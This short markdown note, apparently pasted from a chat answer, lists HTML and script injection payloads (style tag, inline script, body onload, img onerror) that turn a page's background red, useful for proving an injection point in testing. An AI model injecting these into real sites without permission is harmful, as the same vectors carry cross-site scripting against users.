# Html-Injection-Payload

## HTML Injection Payload to Change Background Color for Body

To change the background color of the `<body>` element using an HTML injection payload, you can inject an inline `<style>` tag or use an inline `<script>` tag if JavaScript execution is permitted. Below are some **common payloads** depending on the allowed context.

---

## 1. Inline `<style>` Injection (if HTML/CSS is allowed)

```html
<style>body { background: red !important; }</style>
Explanation:
This payload injects a CSS rule that forces the body background color to red.

2. Inline JavaScript Payload (if JavaScript is allowed)
html
Copy code
<script>document.body.style.background='red'</script>
Explanation:
This script executes immediately and changes the background color of the page.

3. Event Attribute Injection (if attributes are possible)
Using onload in the <body> tag
html
Copy code
<body onload="document.body.style.background='red'">
Using an injected attribute in another tag
html
Copy code
<img src=x onerror="document.body.style.background='red'">
Explanation:
The JavaScript runs when the event (onload or onerror) is triggered.

Usage Notes
Payload success depends on where the input is injected and how input validation or sanitization is implemented.

Background colors can be changed using:

Named colors: red, blue, green

Hex values: #ff0000, #00ff00, #0000ff

RGB values: rgb(255,0,0)